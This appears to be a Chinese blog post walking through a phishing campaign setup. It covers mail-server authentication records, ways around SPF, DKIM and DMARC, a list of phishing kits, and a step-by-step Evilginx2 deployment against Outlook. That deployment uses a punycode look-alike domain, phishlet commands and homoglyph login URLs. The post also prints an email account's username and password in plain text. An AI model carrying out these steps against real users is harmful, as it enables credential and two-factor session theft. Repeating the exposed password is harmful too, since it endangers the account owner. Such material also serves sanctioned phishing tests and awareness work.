+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">service opendkim restart</div><div class="line">service postfix restart</div><div class="line">chkconfig opendkim on</div></pre></td></tr></table></figure>
+<p>PS: 第一次启动如果出现 Generating default DKIM keys: hostname: Unknown host 可以在 /etc/hosts 上面加上域名，例如：</p>
+<p>127.0.0.1 lomu.me localhost localhost.localdomain localhost4 localhost4.localdomain4</p>
+<h3 id="设置DMARC"><a href="#设置DMARC" class="headerlink" title="设置DMARC"></a>设置DMARC</h3><p><img src="/uploads/1557322541165.png" alt="1557322541165"></p>
+<p><img src="/uploads/1557322561138.png" alt="1557322561138"></p>
+<p>DMARC协议是有效解决信头From伪造而诞生的一种新的邮件来源验证手段，为邮件发件人地址提供强大保护，并在邮件收发双方之间建立起一个数据反馈机制。</p>
+<p>具体信息可以看这里：<a href="http://dmarc.org/overview/" target="_blank" rel="external">http://dmarc.org/overview/</a>。</p>
+<p>DMARC记录中常用的参数解释</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">p：用于告知收件方，当检测到某邮件存在伪造我（发件人）的情况，收件方要做出什么处理，处理方式从轻到重依次为：none为不作任何处理；quarantine为将邮件标记为垃圾邮件；reject为拒绝该邮件。初期建议设置为none。</div><div class="line"></div><div class="line">rua：用于在收件方检测后，将一段时间的汇总报告，发送到哪个邮箱地址。</div><div class="line"></div><div class="line">ruf：用于当检测到伪造邮件时，收件方须将该伪造信息的报告发送到哪个邮箱地址。</div></pre></td></tr></table></figure>
+<p>例如我设置的是<code>v=DMARC1;p=reject;rua=me@lomu.me</code>，意思是拒绝伪造邮件，并且将一段时间的汇总报告发送给我。</p>
+<p>添加到DNS</p>
+<p>添加TXT记录，主机名：_dmarc，记录值：<code>v=DMARC1;p=reject;rua=me@lomu.me</code></p>
+<h3 id="设置PTR"><a href="#设置PTR" class="headerlink" title="设置PTR"></a>设置PTR</h3><p>PTR记录，是电子邮件系统中的邮件交换记录的一种；另一种邮件交换记录是A记录（在IPv4协议中）或AAAA记录（在IPv6协议中）。PTR记录常被用于反向地址解析。</p>
+<p>PTR记录也就是IP反向解析，我们常见的解析都是将域名A记录解析到IP，PTR则是将IP反向解析到对应的域名，通过设置PTR可以提高发信方的信誉，从而提高到达率。</p>
+<p><strong>PTR设置</strong></p>
+<p>通过观察，一般国外的VPS都会直接将购买的时候的hostname设置为PTR记录值，但是我买的阿里云的并没有，所以这个需要提交售后工单要求客服帮你添加的，添加的值为安装postfix的时候设置的myhostname，例如我的是mail.lomu.me。</p>
+<p>添加好了以后可以通过以下命令查看</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">dig -x  IP</div></pre></td></tr></table></figure>
+<p>如果看到了PTR记录为你的域名那就说明成功了。</p>
+<p>到这里，基本上只要不发垃圾邮件，邮件的到达率应该就没啥问题了。</p>
+<p>这里给大家推荐一个测试工具：<a href="http://www.mail-tester.com/" target="_blank" rel="external">http://www.mail-tester.com/</a>，只要给页面上的邮箱随便发一封邮件，然后点击按钮提交就可以看到测试结果，里面会有一些优化建议，非常好用。</p>
+<h3 id="发信"><a href="#发信" class="headerlink" title="发信"></a>发信</h3><h3 id="SPF绕过"><a href="#SPF绕过" class="headerlink" title="SPF绕过"></a>SPF绕过</h3><p>假如说我们想要伪造发送者abc公司 abc.com的邮件，但是abc.com受到SPF策略的保护，但是我们仍然可以伪造abc.com的子域名的邮件，这样看起来像是abc公司的一个部门，或者一个活动的邮箱。比如hr.abc.comservice.abc.com</p>
+<h3 id="DKIM绕过"><a href="#DKIM绕过" class="headerlink" title="DKIM绕过"></a>DKIM绕过</h3><p>参考：</p>
+<p><a href="https://www.4hou.com/web/7857.html" target="_blank" rel="external">绕过DKIM验证，伪造钓鱼邮件</a></p>
+<p>伪造前原邮件：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">DKIM-Signature: v=1; h=from:to:cc:subject:content-type; ...</div><div class="line">From: &lt;dkim-test@chksum.de&gt;</div><div class="line">To: knurrt.hase@gmail.com</div><div class="line">Subject: 20170920:1755 - good</div><div class="line">Content-type: multipart/mixed; boundary=foo</div><div class="line">Date: Wed, 20 Sep 2017 17:55:18 +0200</div><div class="line"></div><div class="line">--foo</div><div class="line">Content-type: text/plain</div><div class="line"></div><div class="line">some text</div><div class="line">--foo--</div></pre></td></tr></table></figure>
+<p>伪造后邮件：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">Subject: Urgent Update at http://foo</div><div class="line">Content-type: multipart/mixed; boundary=bar</div><div class="line">DKIM-Signature: v=1; h=from:to:cc:subject:content-type; ...</div><div class="line">From: &lt;dkim-test@chksum.de&gt;</div><div class="line">To: knurrt.hase@gmail.com</div><div class="line">Subject: 20170920:1755 - good</div><div class="line">Content-type: multipart/mixed; boundary=foo</div><div class="line">Date: Wed, 20 Sep 2017 17:55:18 +0200</div><div class="line"></div><div class="line">--foo</div><div class="line">Content-type: text/plain</div><div class="line"></div><div class="line">some text</div><div class="line">--foo--</div></pre></td></tr></table></figure>
+<p>我们可以观察到subject是不同的，并且邮件正文已经没有了，但是DKIM验证结果还是正确的。</p>
+<p>在特定的情况下，攻击者不仅可以控制Content-Type之类的头部，而且还可以控制邮件的正文，包括改变正文内容，或者添加附件。当然在添加的同时保证了DKIM的验证结果仍然有效。</p>
+<p>如果邮件发送方在签名中使用了’l’选项，那么这种攻击就可以被实现。通常’l’属性是用于保护签名的有效性，即使邮件服务器或者防火墙在邮件正文末尾添加了它们各自的签名。比如“这一邮件已经通过xyz杀毒软件的扫描”类似的字段。</p>
+<p>通常情况下,服务器设置的’l’值是覆盖的正文全部内容的。因此，可以推断出我们不能改变正文的内容，但是可以在正文最后添加一些东西。不过我在德国的一家大型企业中发现，不管他们发送的邮件长度为多少，他们的DKIM只是覆盖了邮件的前10个字符。这种错误的配置使得攻击变得更为简单。</p>
+<p>作为一个例子，在2016年年初我们通过DHL.com发送了一个实际的邮件。因为没有添加DKIM签名到期时间，所以在2017年9月这一签名还是有效的。并且DHL也没有更改RSA加密的密钥。原始邮件在Gmail的web界面看起来如下图：</p>
+<p><img src="/uploads/1507271089368584.png" alt="绕过DKIM验证，伪造钓鱼邮件"></p>
+<p>通过查看这一邮件的源代码，发现一些选项是被签名保护的，但是签名并没有防止添加另外字段。并且在签名中，一些重要的选项并没有包含其中。正文hash值仅仅涵盖了邮件的特定部分，所以在原始邮件正文中添加任何东西都不会使签名验证失效。</p>
+<p>具体来说的话，我们可以在邮件中继续添加另外一个Date、To、Message-Id等等其他选项，并且可以更改当前的Content-Type、在正文中添加任意数据。这样都不会使签名无效。更改的内容为红色，原始邮件为黑色和蓝色：</p>
+<p><img src="/uploads/1507271157944307.png" alt="绕过DKIM验证，伪造钓鱼邮件"></p>
+<p>这里能够替换正文的原因是因为重新定义了具有不同MIME边界的Content-Type。在MIME边界之前的任何内容都被视为MIME的前导码，并且在任何兼容mime的邮件客户端中忽略。这就意味着在客户端显示的邮件内容是攻击者修改之后的内容，而不是原始的邮件内容。</p>
+<p><img src="/uploads/1507271210222933.png" alt="绕过DKIM验证，伪造钓鱼邮件"></p>
+<p>在”signed-by”字段中可以看到签名仍然有效。而且如果我们查看邮件的来源，Gmail会提供一个很好的摘要，其中包括攻击者设置的Date以及Messahe-Id.由于DKIM签名与显示的发件人DMARC的域相匹配，所以即使邮件未通过DHL的邮件服务器发送，也会成功：</p>
+<p><img src="/uploads/1507271581286128.png" alt="绕过DKIM验证，伪造钓鱼邮件"></p>
+<h3 id="DMARC绕过"><a href="#DMARC绕过" class="headerlink" title="DMARC绕过"></a>DMARC绕过</h3><p>参考：</p>
+<p><a href="https://tmr.js.org/p/b1092e4e/" target="_blank" rel="external">邮件安全</a></p>
+<p><img src="/uploads/1557763438503.png" alt="1557763438503"></p>
+<p><img src="/uploads/1557763832565.png" alt="1557763832565"></p>
+<p><img src="/uploads/1557774539072.png" alt="1557774539072">　</p>
+<h2 id="中期钓鱼邮件部署"><a href="#中期钓鱼邮件部署" class="headerlink" title="中期钓鱼邮件部署"></a>中期钓鱼邮件部署</h2><h3 id="伪造链接"><a href="#伪造链接" class="headerlink" title="伪造链接"></a>伪造链接</h3><p><strong><a>标签</a></strong></p>
+<p>参考：</p>
+<p><a href="https://paper.seebug.org/538/" target="_blank" rel="external">危险的 target=”_blank” 与 “opener”</a></p>
+<p>详细步骤</p>
+<p>1.在你的网站 <code>https://example.com</code> 上存在一个链接： <code>&lt;a href=&quot;https://an.evil.site&quot;target=&quot;_blank&quot;&gt;进入一个“邪恶”的网站&lt;/a&gt;</code></p>
+<p>2.用户点击了这个链接，在新的标签页打开了这个网站。这个网站可以通过 HTTP Header 中的 <code>Referer</code> 属性来判断用户的来源。</p>
+<p><strong>punnycode</strong></p>
+<p>参考：</p>
+<p>[七亿元学费，教你Unicode钓鱼](<a href="http://www.freebuf.com/web/165975.html）" target="_blank" rel="external">http://www.freebuf.com/web/165975.html）</a></p>
+<p><a href="https://tools.kali.org/information-gathering/urlcrazy" target="_blank" rel="external">urlcrazy</a></p>
+<p><img src="/uploads/1556153501_5cc1049ddd5cb.png!small" alt="img"></p>
+<p><a href="https://github.com/ring0lab/catphish" target="_blank" rel="external">catphish</a></p>
+<p><img src="/uploads/image1.png" alt="img"></p>
+<p><a href="https://github.com/UndeadSec/EvilURL" target="_blank" rel="external">EvilUrl</a></p>
+<p><img src="/uploads/sc.png" alt="img"></p>
+<p><a href="https://www.youtube.com/watch?v=ug5ZuezbD3c&amp;feature=youtu.be" target="_blank" rel="external">演示视频</a></p>
+<p><a href="https://github.com/monkeym4ster/DomainFuzz" target="_blank" rel="external">DomainFuzz</a></p>
+<p><img src="/uploads/demo.gif" alt="img"></p>
+<p>短连接</p>
+<p><a href="http://mos86.com/59062.html" target="_blank" rel="external">http://mos86.com/59062.html</a></p>
+<h3 id="伪造跳转页"><a href="#伪造跳转页" class="headerlink" title="伪造跳转页"></a>伪造跳转页</h3><p>php302跳转</p>
+<p><a href="https://masterxsec.github.io/2018/01/07/XSS%E9%92%93%E9%B1%BC%E8%8E%B7%E5%8F%96%E5%90%8E%E5%8F%B0%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81/" target="_blank" rel="external">XSS钓鱼获取后台账号密码</a></p>
+<p>以前：</p>
+<p>Nginx 反向代理型钓鱼网站</p>
+<p><a href="https://github.com/kgretzky/evilginx" target="_blank" rel="external">https://github.com/kgretzky/evilginx</a><br><a href="https://breakdev.org/evilginx-1-0-update-up-your-game-in-2fa-phishing/" target="_blank" rel="external">https://breakdev.org/evilginx-1-0-update-up-your-game-in-2fa-phishing/</a></p>
+<p>一个非常邪恶的钓鱼工具，利用Nginx反向代理制作钓鱼网站，你所有在钓鱼网站上的访问和操作都转发成了真实操作，以前搞web安全的时候就有的攻防想法，现在老外已经很方便的工具化实现了。</p>
+<p>现在：</p>
+<p><strong>Evilginx2.0</strong></p>
+<h2 id="后期钓鱼邮件部署"><a href="#后期钓鱼邮件部署" class="headerlink" title="后期钓鱼邮件部署"></a>后期钓鱼邮件部署</h2><h3 id="权限维持"><a href="#权限维持" class="headerlink" title="权限维持"></a>权限维持</h3><p>参考：</p>
+<p><a href="https://www.freebuf.com/articles/web/164870.html" target="_blank" rel="external">https://www.freebuf.com/articles/web/164870.html</a></p>
+<p>为了防止目标对出站流量使用代理的情况，一个SSL证书将有助于确保目标系统和攻击者系统间的通信。在攻击者控制的域使用SSL证书。使用<a href="https://letsencrypt.org/" target="_blank" rel="external">Let’s Encrypt</a>创建SSL证书。然后通过结合使用’privkey.pem’文件创建的’cert.pem’文件，创建一个名为’full.pem’的文件。 ‘full.pem’将与handler一起使用。</p>
+<h2 id="钓鱼工具推荐"><a href="#钓鱼工具推荐" class="headerlink" title="钓鱼工具推荐"></a>钓鱼工具推荐</h2><h3 id="Evilginx2"><a href="#Evilginx2" class="headerlink" title="Evilginx2"></a>Evilginx2</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">https://github.com/kgretzky/evilginx2/releases/tag/2.2.0</div></pre></td></tr></table></figure>
+<h3 id="Blackeye"><a href="#Blackeye" class="headerlink" title="Blackeye"></a>Blackeye</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">https://github.com/flagellantX/blackeye</div></pre></td></tr></table></figure>
+<h3 id="ISeeYou"><a href="#ISeeYou" class="headerlink" title="ISeeYou"></a>ISeeYou</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">https://github.com/Viralmaniar/I-See-You.git</div></pre></td></tr></table></figure>
+<h3 id="ReelPhish"><a href="#ReelPhish" class="headerlink" title="ReelPhish"></a>ReelPhish</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">https://github.com/fireeye/ReelPhish</div></pre></td></tr></table></figure>
+<h3 id="EvilURL"><a href="#EvilURL" class="headerlink" title="EvilURL"></a>EvilURL</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">https://github.com/UndeadSec/EvilURL.git</div></pre></td></tr></table></figure>
+<h3 id="King-Phisher"><a href="#King-Phisher" class="headerlink" title="King-Phisher"></a>King-Phisher</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">https://github.com/securestate/king-phisher/releases</div></pre></td></tr></table></figure>
+<h3 id="PhEmail"><a href="#PhEmail" class="headerlink" title="PhEmail"></a>PhEmail</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">https://github.com/Dionach/PhEmail</div></pre></td></tr></table></figure>
+<h3 id="Credsleaker"><a href="#Credsleaker" class="headerlink" title="Credsleaker"></a>Credsleaker</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">https://github.com/Dviros/CredsLeaker</div></pre></td></tr></table></figure>
+<h3 id="FiercePhish"><a href="#FiercePhish" class="headerlink" title="FiercePhish"></a>FiercePhish</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">FiercePhish</div></pre></td></tr></table></figure>
+<h3 id="SimpleEmailSpoofer"><a href="#SimpleEmailSpoofer" class="headerlink" title="SimpleEmailSpoofer"></a>SimpleEmailSpoofer</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">https://github.com/lunarca/SimpleEmailSpoofer</div></pre></td></tr></table></figure>
+<h3 id="Modlishka"><a href="#Modlishka" class="headerlink" title="Modlishka"></a>Modlishka</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">https://github.com/drk1wi/Modlishka</div></pre></td></tr></table></figure>
+<h3 id="SET"><a href="#SET" class="headerlink" title="SET"></a>SET</h3><h3 id="Swaks"><a href="#Swaks" class="headerlink" title="Swaks"></a>Swaks</h3><h3 id="在线工具"><a href="#在线工具" class="headerlink" title="在线工具"></a>在线工具</h3><p><a href="http://www.fakemailgenerator.com/" target="_blank" rel="external">http://www.fakemailgenerator.com/</a></p>
+<p><a href="https://emkei.cz/" target="_blank" rel="external">https://emkei.cz/</a></p>
+<h2 id="隐藏信息"><a href="#隐藏信息" class="headerlink" title="隐藏信息"></a>隐藏信息</h2><h3 id="隐藏服务器信息"><a href="#隐藏服务器信息" class="headerlink" title="隐藏服务器信息"></a>隐藏服务器信息</h3><h3 id="域名前置"><a href="#域名前置" class="headerlink" title="域名前置"></a>域名前置</h3><p>参考：</p>
+<p><a href="https://www.4hou.com/web/17960.html" target="_blank" rel="external">【安全研究】Domain fronting域名前置网络攻击技术</a></p>
+<h3 id="隐藏邮件服务器信息"><a href="#隐藏邮件服务器信息" class="headerlink" title="隐藏邮件服务器信息"></a>隐藏邮件服务器信息</h3><p>参考：</p>
+<p><a href="https://major.io/2013/04/14/remove-sensitive-information-from-email-headers-with-postfix/" target="_blank" rel="external">https://major.io/2013/04/14/remove-sensitive-information-from-email-headers-with-postfix/</a></p>
+<h2 id="新型钓鱼方法"><a href="#新型钓鱼方法" class="headerlink" title="新型钓鱼方法"></a>新型钓鱼方法</h2><h3 id="USB钓鱼"><a href="#USB钓鱼" class="headerlink" title="USB钓鱼"></a>USB钓鱼</h3><h3 id="全屏API"><a href="#全屏API" class="headerlink" title="全屏API"></a>全屏API</h3><h3 id="PhishPoint绕过office-365保护"><a href="#PhishPoint绕过office-365保护" class="headerlink" title="PhishPoint绕过office 365保护"></a>PhishPoint绕过office 365保护</h3><h3 id="MAM快捷方式钓鱼"><a href="#MAM快捷方式钓鱼" class="headerlink" title="MAM快捷方式钓鱼"></a>MAM快捷方式钓鱼</h3><h3 id="利用TLS网络钓鱼"><a href="#利用TLS网络钓鱼" class="headerlink" title="利用TLS网络钓鱼"></a>利用TLS网络钓鱼</h3><h3 id="Python-Package-钓鱼"><a href="#Python-Package-钓鱼" class="headerlink" title="Python Package 钓鱼"></a>Python Package 钓鱼</h3><h3 id="VSCODE-EXTENSION-钓鱼"><a href="#VSCODE-EXTENSION-钓鱼" class="headerlink" title="VSCODE EXTENSION 钓鱼"></a>VSCODE EXTENSION 钓鱼</h3><h2 id="本地测试过程记录"><a href="#本地测试过程记录" class="headerlink" title="本地测试过程记录"></a>本地测试过程记录</h2><p>参考：</p>
+<p><a href="https://www.freebuf.com/articles/web/201868.html" target="_blank" rel="external">如何绕过2FA执行钓鱼攻击？</a></p>
+<p><a href="https://www.cyberpunk.rs/evilginx-phishing-examples-v2-x-linkedin-facebook-custom" target="_blank" rel="external">https://www.cyberpunk.rs/evilginx-phishing-examples-v2-x-linkedin-facebook-custom</a></p>
+<p><a href="https://youtu.be/dUwzeyJW0Po" target="_blank" rel="external">https://youtu.be/dUwzeyJW0Po</a></p>
+<h3 id="0x01-搭建钓鱼EC2服务器"><a href="#0x01-搭建钓鱼EC2服务器" class="headerlink" title="0x01 搭建钓鱼EC2服务器"></a>0x01 搭建钓鱼EC2服务器</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">git clone https://github.com/UndeadSec/EvilURL</div><div class="line">➜  EvilURL git:(master) python3 evilurl.py</div></pre></td></tr></table></figure>
+<p><img src="/uploads/1557820228685.png" alt="1557820228685"></p>
+<p><img src="/uploads/1557820256676.png" alt="1557820256676"></p>
+<p><img src="/uploads/1557820307124.png" alt="1557820307124"></p>
+<p><img src="/uploads/1557820322899.png" alt="1557820322899"></p>
+<p>浏览器访问后跳转到：</p>
+<p><a href="http://xn--utlk-45dda.ml/" target="_blank" rel="external">http://xn--utlk-45dda.ml/</a></p>
+<p>然后去<a href="http://dot.tk" target="_blank" rel="external">http://dot.tk</a>　查找可注册域名，点击checkout，填入自己的EC2服务器地址，输入自己邮箱后,验证邮箱：（如果挂代理，注册的时候选的国家要与代理国家一致）：</p>
+<p><img src="/uploads/1557824862940.png" alt="1557824862940"></p>
+<p><img src="/uploads/1557825071987.png" alt="1557825071987"></p>
+<p><img src="/uploads/1557826258267.png" alt="1557826258267"></p>
+<p>配置完成后</p>
+<p>我们可以在EC2服务器上开个apache2服务看看，然后浏览器访问：<a href="http://www.xn--utlk-45dda.ml" target="_blank" rel="external">http://www.xn--utlk-45dda.ml</a></p>
+<p><img src="/uploads/1557825559099.png" alt="1557825559099"></p>
+<p>安装Evilnginx2</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">wget https://github.com/kgretzky/evilginx2/releases/download/2.2.0/evilginx_linux_x86_2.2.0.zip</div><div class="line">apt-get install unzip</div><div class="line">unzip evilginx</div><div class="line">cd evilginx</div><div class="line">chmod +x install.sh</div><div class="line">chmod +x evilginx</div></pre></td></tr></table></figure>
+<p><img src="/uploads/1557825776174.png" alt="1557825776174"></p>
+<p>输入一下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">: config domain xn--utlk-45dda.cf</div><div class="line">: config ip 149.28.134.114</div><div class="line">: phishlets hostname outlook xn--utlk-45dda.cf</div></pre></td></tr></table></figure>
+<p>配置完后如下：</p>
+<p><img src="/uploads/1557833248322.png" alt="1557833248322"></p>
+<p>配置CNAME:</p>
+<p><img src="/uploads/1557833460435.png" alt="1557833460435"></p>
+<p>输入：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">:phishlets enable outlook</div></pre></td></tr></table></figure>
+<p><img src="/uploads/1557833490275.png" alt="1557833490275"></p>
+<p>输入：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">: phishlets get-url outlook http://www.google.com</div></pre></td></tr></table></figure>
+<p><img src="/uploads/1557833552190.png" alt="1557833552190"></p>
+<p>访问该URL:</p>
+<p><img src="/uploads/1557833575867.png" alt="1557833575867"></p>
+<p>输入：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">:sessions</div></pre></td></tr></table></figure>
+<p><img src="/uploads/1557833654174.png" alt="1557833654174"></p>
+<p>把URL换成punycode:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">https://login.оutlооk.cf/login.srf?wa=wsignin1.0&amp;rpsnv=13&amp;ct=1557833623&amp;rver=7.0.6737.0&amp;wp=MBI_SSL&amp;wreply=https%3a%2f%2foutlook.live.com%2fowa%2f%3fnlp%3d1%26sj%3d9d1e%26mh%3daHR0cDovL3d3dy5nb29nbGUuY29t%26RpsCsrfState%3d9299fc6e-f281-942f-544a-1b8c31a69d8c&amp;id=292841&amp;aadredir=1&amp;CBCXT=out&amp;lw=1&amp;fl=dob%2cflname%2cwld&amp;cobrandid=90015</div></pre></td></tr></table></figure>
+<p>或者：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">https://outlook.оutlооk.cf/owa/?nlp=1&amp;sj=9d1e&amp;mh=aHR0cDovL3d3dy5nb29nbGUuY29t</div></pre></td></tr></table></figure>
+<p>访问即可跳转到上面的钓鱼页</p>
+<h3 id="0x02-搭建邮件服务器"><a href="#0x02-搭建邮件服务器" class="headerlink" title="0x02 搭建邮件服务器"></a>0x02 搭建邮件服务器</h3><h4 id="搭建本地邮件服务器"><a href="#搭建本地邮件服务器" class="headerlink" title="搭建本地邮件服务器"></a>搭建本地邮件服务器</h4><p>参考：</p>
+<p><a href="http://lomu.me/post/linux-email-server" target="_blank" rel="external">Linux系统下邮件服务器的搭建（Postfix+Dovecot）</a></p>
+<p><a href="http://lomu.me/post/SPF-DKIM-DMARC-PTR" target="_blank" rel="external">邮件服务器添加SPF、DKIM、DMARC、PTR提高送达率</a></p>
+<p><img src="/uploads/1557906404207.png" alt="1557906404207"></p>
+<p><img src="/uploads/1557906431568.png" alt="1557906431568"></p>
+<p><img src="/uploads/1557906097512.png" alt="1557906097512"></p>
+<p><img src="/uploads/1557906112661.png" alt="1557906112661"></p>
+<h4 id="在线邮箱服务"><a href="#在线邮箱服务" class="headerlink" title="在线邮箱服务"></a>在线邮箱服务</h4><p>outlook account:</p>
+<p><img src="/uploads/1557914207203.png" alt="1557914207203"></p>
+<p>yahoo account:</p>
+<p>jack_tt_test@yahoo.com</p>
+<p>Jjtt1234!</p>
+<p>开启这个才能用第三方来登录</p>
+<p><img src="/uploads/1557918904620.png" alt="1557918904620"></p>
+<p>尝试第一次发送：</p>
+<p>Yahoo -&gt; OutLook</p>
+<p><img src="/uploads/1557918612171.png" alt="1557918612171"></p>
+<p><img src="/uploads/1557920723743.png" alt="1557920723743"></p>
+<h2 id="实战过程记录"><a href="#实战过程记录" class="headerlink" title="实战过程记录"></a>实战过程记录</h2><p>略</p>
+<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://www.radebit.com/web/article/160.html" target="_blank" rel="external">利用Cobalt strike一步步教你发送钓鱼邮件</a></p>
+<p><a href="http://www.freebuf.com/articles/web/119615.html" target="_blank" rel="external">案例分析：利用OAuth实施钓鱼</a></p>
+<p><a href="https://4hou.win/wordpress/?p=27207" target="_blank" rel="external">Evilginx2：一款用于网络钓鱼窃取凭证及cookie的中间人攻击框架</a></p>
+<p><a href="https://www.freebuf.com/articles/web/201868.html" target="_blank" rel="external">如何绕过2FA执行钓鱼攻击？</a></p>
+<p><a href="https://www.freebuf.com/sectool/140863.html" target="_blank" rel="external">King Phisher：一款专业的钓鱼活动工具包</a></p>
+<p><a href="https://nosec.org/home/detail/2295.html" target="_blank" rel="external">利用Azure Blob存储对Outlook和Microsoft的用户进行钓鱼攻击</a></p>
+<p><a href="https://www.youtube.com/watch?v=sNuVaVtfick" target="_blank" rel="external">DMARC - How it works and what it does</a></p>
+<p><a href="https://breakdev.org/evilginx-2-next-generation-of-phishing-2fa-tokens/" target="_blank" rel="external">Evilginx 2 - Next Generation of Phishing 2FA Tokens</a></p>
+<p><a href="https://www.freebuf.com/articles/web/164870.html" target="_blank" rel="external">关于网络钓鱼的深入讨论 - FreeBuf互联网安全新媒体平台</a></p>
+<p><a href="https://www.4hou.com/web/13931.html" target="_blank" rel="external">关于电子邮件诈骗的一些分析</a></p>
+<p><a href="https://fl4g.cn/2018/08/15/PhEmail-%E9%82%AE%E4%BB%B6%E9%92%93%E9%B1%BC%E6%B5%8B%E8%AF%95%E5%B7%A5%E5%85%B7%E5%AE%9E%E9%99%85%E4%BD%BF%E7%94%A8%E8%B8%A9%E8%BF%87%E7%9A%84%E5%9D%91/" target="_blank" rel="external">邮件钓鱼测试工具实际使用踩过的坑</a></p>
+
+      
+    </div>
+
+    <div>
+      
+        
+
+      
+    </div>
+
+    <div>
+      
+        
+
+      
+    </div>
+
+    <div>
+      
+        
+
+      
+    </div>
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/社工/" rel="tag"># 社工</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2019/05/09/抖音视频音乐网易音乐下载/" rel="next" title="抖音视频、网易云音乐下载教程">
+                <i class="fa fa-chevron-left"></i> 抖音视频、网易云音乐下载教程
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2019/05/16/CVE-2019-9978(wordpress)/" rel="prev" title="CVE-2919-9978 wordpress social warfare插件RCE">
+                CVE-2919-9978 wordpress social warfare插件RCE <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+  <div class="comments" id="comments">
+    
+  </div>
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap" >
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+          <img class="site-author-image" itemprop="image"
+               src="/uploads/logo2.jpg"
+               alt="" />
+          <p class="site-author-name" itemprop="name"></p>
+           
+              <p class="site-description motion-element" itemprop="description"></p>
+          
+        </div>
+        <nav class="site-state motion-element">
+
+          
+            <div class="site-state-item site-state-posts">
+              <a href="/archives">
+                <span class="site-state-item-count">24</span>
+                <span class="site-state-item-name">日志</span>
+              </a>
+            </div>
+          
+
+          
+            
+            
+            <div class="site-state-item site-state-categories">
+              <a href="/movie/index.html">
+                <span class="site-state-item-count">1</span>
+                <span class="site-state-item-name">分类</span>
+              </a>
+            </div>
+          
+
+          
+            
+            
+            <div class="site-state-item site-state-tags">
+              
+                <span class="site-state-item-count">15</span>
+                <span class="site-state-item-name">标签</span>
+              
+            </div>
+          
+
